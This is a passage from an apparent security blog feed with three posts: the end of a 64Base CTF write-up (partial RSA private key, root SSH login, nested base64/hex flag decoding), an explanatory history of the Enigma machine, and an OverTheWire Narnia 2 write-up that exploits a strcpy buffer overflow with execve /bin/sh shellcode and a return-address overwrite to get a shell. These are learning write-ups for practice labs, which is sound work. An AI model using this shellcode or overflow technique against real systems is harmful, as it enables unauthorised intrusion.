+qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
+64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
+fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
+/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
+-----END RSA PRIVATE KEY-----&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have &lt;b&gt;RSA Private Key&lt;/b&gt;! Now, here's when magic happened. I tried to login to the SSH, using root account with, just obtained, RSA key. Before even trying to crack the password, I tried a few hints that were given to us during this challenge. Luckily, with my amusement, I've found that &lt;b&gt;usetheforce&lt;/b&gt; is correct password! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;chmod 600 key.txt
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh root@192.168.56.102 -p 62964 -i key.txt
+Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'key.txt'&lt;/span&gt;:
+
+Last login: Wed Dec  7 16:27:53 2016 from localhost
+
+flag6&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+root@64base:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Awesome! Now we can decode this flag. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK | base64 -d
+4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;4e546b325a4451324e324531595455304e546b7a4d4451354e444d7a4d545a694e446b304d7a4d354d7a49314f5455344e446b334e6a59794e44637a4f545a684e546b314e7a63334e7a5930597a5a6b4e7a677a4d5459784d7a49314e6a4d344e6a49304e7a55324e3245324d7a63354d7a55334f5456684e5463304e6a637a4e444d324e7a4e6b4d32517759516f3d0a | xxd -r -p
+&lt;span class=&quot;nv&quot;&gt;NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTk2ZDQ2N2E1YTU0NTkzMDQ5NDMzMTZiNDk0MzM5MzI1OTU4NDk3NjYyNDczOTZhNTk1Nzc3NzY0YzZkNzgzMTYxMzI1NjM4NjI0NzU2N2E2Mzc5MzU3OTVhNTc0NjczNDM2NzNkM2QwYQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
+596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;596d467a5a5459304943316b49433932595849766247396a595777764c6d7831613256386247567a637935795a57467343673d3d0a | xxd -r -p
+&lt;span class=&quot;nv&quot;&gt;YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;YmFzZTY0IC1kIC92YXIvbG9jYWwvLmx1a2V8bGVzcy5yZWFsCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
+base64 -d /var/local/.luke|less.real&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;What can it be? &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/finish.png&quot; alt=&quot;Finish&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;64Base was an awesome challenge, with lots of tricks, some hard, some easy, but all really entertaining and interesting. Big thanks to &lt;a href=&quot;https://3mrgnc3.ninja/2016/12/64base/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;&lt;b&gt;VulnHub&lt;/b&gt;&lt;/a&gt; for hosting it! &lt;/p&gt;
+&lt;p&gt;I also hope, that you've enjoyed this write-up, I'll definitely do more of these in the future, so stay updated. And as always... &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">Enigma</title><link href="http://localhost:4000/2017/02/07/enigma/" rel="alternate" type="text/html" title="Enigma" /><published>2017-02-07T01:00:00+01:00</published><updated>2017-02-07T01:00:00+01:00</updated><id>http://localhost:4000/2017/02/07/enigma</id><content type="html" xml:base="http://localhost:4000/2017/02/07/enigma/">&lt;h1&gt;Brief history behind Enigma&lt;/h1&gt;
+
+&lt;p&gt;The first Enigma machine was discovered by &lt;b&gt;Arthur Scherbius&lt;/b&gt;, German engineer who acquired the patent in 1918. Name of this device originated from Greek word - riddle.  It was used commercially from the early 1920s, and was also adopted by the military and governmental services of a number of nations — most famously German Army. Communication during those days was sent over radio which means that everyone could easily listen. But at that moment no one could spy on Nazi messages - Scherbius' Enigma provided them with the strongest cryptographic cipher of the world. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/scherbius.jpg&quot; alt=&quot;Scherbius&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Arthur Scherbius&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;Since 1926 English cryptanalysts were eavesdropping German radio messages, unfortunately without being able to extract their meaning. But Polish officials, afraid of German attack started working on analyzing and breaking the cipher in office called Cipher Bureau (Biuro Szyfrów). By 1933 &lt;b&gt;Marian Rejewski&lt;/b&gt;, &lt;b&gt;Henryk Zygalski&lt;/b&gt; and &lt;b&gt;Jerzy Różycki&lt;/b&gt; broke Enigma, by exploiting a fatal flaw of how Enigma operators sent their messages, and were able to determine the daily keys of almost every message that was intercepted. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/polish-crypto-breakers.jpg&quot; alt=&quot;Polish-cryptanalysts&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;From left: Jerzy Różycki, Henryk Zygalski and Marian Rejewski&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt; They even developed a machine called the Bombe (Bomba), that made the process of codebreaking much faster. But back then keys were changing only once every few months, while during the war keys were changing at least once a day. In July 1939, just before the start of war Poles decided to inform the British and French about their research, also asking for help.   &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/enigma-machine.jpg&quot; alt=&quot;Enigma-photo&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Enigma&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;At Bletchley Park &lt;b&gt;Alan Turing&lt;/b&gt;, together with fellow code-breaker &lt;b&gt;Gordon Welchman&lt;/b&gt; invented different version of Bombe. When an Enigma message was intercepted, codebreakers had to search for so-called cribs, which were presumed pieces of plain text within the encrypted message. That way Turing Bombe would search for the enigma settings for a given piece of plain and cipher text. Although the British bombe actually owes little to the Bomba, Poles contributed a lot by supplying the internal wiring of the Enigma's rotors. They also demonstrated that Enigma can be broked using another machine. It has been estimated that the efforts of Turing and his fellow code-breakers shortened the war by several years. What is certain is that they saved countless lives and helped to determine the course and outcome of the conflict.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/bombe.jpeg&quot; alt=&quot;British-bombe&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;British Bombe&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;But let's head back from the history to something more technical. &lt;/p&gt;
+
+&lt;h1&gt;Cryptography&lt;/h1&gt;
+
+&lt;p&gt;Firstly, let's find out how Enigma has worked. &lt;/p&gt;
+
+&lt;p&gt;When sender sends the message, Enigma creates an electrical signal that goes through the wiring of the machine. First step for this signal is plugboard which attempts to get around frequency analysis. Some of the letters on the plugboard would be wired to other letters (plugs). Signal going through one of these plugs change original input into different letter, but also leaving some of the original letters unmoved. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/plugboard.jpg&quot; alt=&quot;Enigma-plugboard&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;View on the plugboard&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is the static rotor, which simply turns wires into static contacts, making the signal pass only when the contacts touch. But after that, things are getting a little bit more complicated. There are 5 rotors, with the possibility to choose 3 of them, for three positions - left, middle and right. Each rotor has their own set of inner, and outer rings of contacts. The outer ring contacts connect to the next rotor, together with its own inner ring. Purpose of these rings is to even more scramble the signal, resulting in more letter substitutions.  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/rotors.png&quot; alt=&quot;Enigma-rotors&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Rotor electrical view&lt;/small&gt;&lt;/p&gt;
+
+&lt;p&gt;In addition, as each letter is entered, the rotors rotate by one position, so that the same letters are never connected together in the same message. And even more, each rotor has notches in different positions which, when reached, cause the next rotor to its left to step forward too.&lt;/p&gt;
+
+&lt;p&gt;Last step that electrical signal takes before going back to the light board is the reflector. In Enigma machine there are 2 possible reflectors, each wired differently and producing different letter when reflected back. Journey back through the rotors works exactly the same way in reverse. Signal remains the same when passing through the static rotor, then going through the plugboard on the same principles. After that, signal goes to lightboard, where the light, corresponding for each letter, lits up.   &lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;But how would you decrypt the message? &lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;To decode your message, you would need to know what rotor and plugboard settings were used during encryption. This was possible with use of monthly sheets, containing basic settings for every day of the month. They were in the custody of an officer, responsible for setting up the machine rotors and ringsettings. After setup, he could lock the machine front panel with a key. The operator of Enigma could only select the rotor start position.  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/key-sheets.jpg&quot; alt=&quot;Key-sheets&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;small&gt;Example of Wehrmacht Enigma key sheet&lt;/small&gt;&lt;/p&gt;
+
+&lt;h1&gt;Mathematical Security of Enigma&lt;/h1&gt;
+
+&lt;p&gt;Now, how secure is Enigma? Let's count all of the possibilities. &lt;/p&gt;
+
+&lt;p&gt;Enigma has 5 rotors, from which 3 are used. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_1.png&quot; alt=&quot;First-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then all 3 rotors have 26 positions, one for each letter of the alphabet. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_2.png&quot; alt=&quot;Second-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Quite a large number, right? Yet, we have to calculate all possibilities with the plug board. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/equation_3.png&quot; alt=&quot;Third-equation&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And lastly, multiply them all together. This gives us quite a lot of combinations.  &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/enigma/possibilities.png&quot; alt=&quot;Possibilities&quot; class=&quot;img-responsive&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1&gt;Last Words&lt;/h1&gt;
+
+&lt;p&gt;Enigma, was without doubt machine with great encryption capabilities. This war could have last much longer, or even end completely different, without hard work of great cryptanalytic minds working together on this operation. &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;
+
+&lt;h1&gt;References&lt;/h1&gt;
+&lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/Enigma_machine&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;[2] Singh Simon (2000) &lt;b&gt;The Code Book: The Science of Secrecy from Ancient Egypt to Quantum Cryptography&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;[3] Rejewski Marian (1981) &lt;b&gt;How the Polish Mathematicians Broke the Enigma. Annals of the History of Computing.&lt;/b&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><summary type="html">Brief history behind Enigma</summary></entry><entry><title type="html">Overthewire.org - Narnia 2 -&amp;gt; 3</title><link href="http://localhost:4000/2017/02/03/overthewire.org-narnia-3/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 2 -&gt; 3" /><published>2017-02-03T01:00:00+01:00</published><updated>2017-02-03T01:00:00+01:00</updated><id>http://localhost:4000/2017/02/03/overthewire.org-narnia-3</id><content type="html" xml:base="http://localhost:4000/2017/02/03/overthewire.org-narnia-3/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;What about another challenge in reverse engineering? Anywhere, anytime! &lt;/p&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;As always, let's start from viewing the source code.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s argument&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, now let's run it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2
+Usage: ./narnia2 argument
+narnia2@melinda:/narnia$ ./narnia2 ARGUMENT
+ARGUMENTnarnia2@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As in the source code, we see that if argument is not passed, then usage instructions are printed, otherwise value of argument is printed on the next line. In addition, source code gives us information that char buf is 128 bytes in size. Let's try to trigger the segmentation fault. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;ARGUMENTnarnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 140&quot;)
+Illegal instruction
+narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 141&quot;)
+Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmm, that's interesting. After trying different amounts of A letters, I've noticed that by writing 140 of them, we will get &lt;b&gt;Illegal instruction&lt;/b&gt; message, but 141 letters end up with our desired &lt;b&gt;Segmentation fault&lt;/b&gt;. Maybe gdb will tell us something more? &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ gdb ./narnia2
+(gdb) break *main
+Breakpoint 1 at 0x804845d&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Firstly let's investigate the illegal instruction option. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 140&quot;)
+Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 140&quot;)
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGILL, Illegal instruction.
+0xf7e3ca00 in __libc_start_main () from /lib32/libc.so.6
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGILL, Illegal instruction.
+The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunately after doing some research I've found out that SIGILL won't help us much. What we have to try is to overwrite the &lt;b&gt;instruction pointer. &lt;/b&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 144&quot;)
+Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 144&quot;)
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Luckily, adding only 3 more A's overwrote the pointer. But here comes another problem, what is its address? &lt;/p&gt;
+&lt;p&gt;We can try to find out by writing around B's at the end. Let's see. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)
+Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 138 + 'B' * 6&quot;)
+
+Breakpoint 1, 0x0804845d in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/200x $esp
+0xffffd7f0:	0x00000000	0x00000000	0xb7000000	0x9449f175
+0xffffd800:	0xb7857a44	0x6da4653e	0x69a15cf3	0x00363836
+0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
+0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x41414141	0x42424242	0x58004242	0x535f4744&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great! EIP address is 0xffffd8b3. Now we have to find a way to use shellcode from previous challenge. But firstly, let's find its length. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ python -c'print(len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;))'
+25&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;25 bytes. As our string have to be 144 bytes in length, I'll firstly write 112 bytes of A letters, then 25 bytes of our shellcode and then overwrite the EIP with memory address somewhere in the middle of A's. Let's try it out! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) run $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)
+Starting program: /games/narnia/narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'B' * 4&quot;)
+
+(gdb) x/200x $esp
+0xffffd7f0:	0x00000000	0x00000000	0x4d000000	0x2bdc9c96
+0xffffd800:	0xd596f713	0x775b1954	0x6969a442	0x00363836
+0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
+0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0xc0314141	0x2f2f6850
+0xffffd8a0:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
+0xffffd8b0:	0x40c03180	0x424280cd	0x58004242	0x535f4744
+0xffffd8c0:	0x49535345	0x495f4e4f	0x30323d44	0x33323431
+0xffffd8d0:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
+0xffffd8e0:	0x52455400	0x74783d4d	0x2d6d7265	0x63363532
+0xffffd8f0:	0x726f6c6f	0x48535300	0x494c435f	0x3d544e45
+0xffffd900:	0x362e3938	0x36312e34	0x3732312e	0x30333320
+0xffffd910:	0x32203434	0x53530032	0x54545f48	0x642f3d59
+0xffffd920:	0x702f7665	0x342f7374	0x434c0033	0x4c4c415f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we can see that even with the shellcode B's overwrote the EIP. Now let's try it with the actuall address - somewhere in the middle of the A letters. Maybe &lt;b&gt;0xffffd863&lt;/b&gt;?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'&quot;)
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we've got the password to the next level!&lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
+
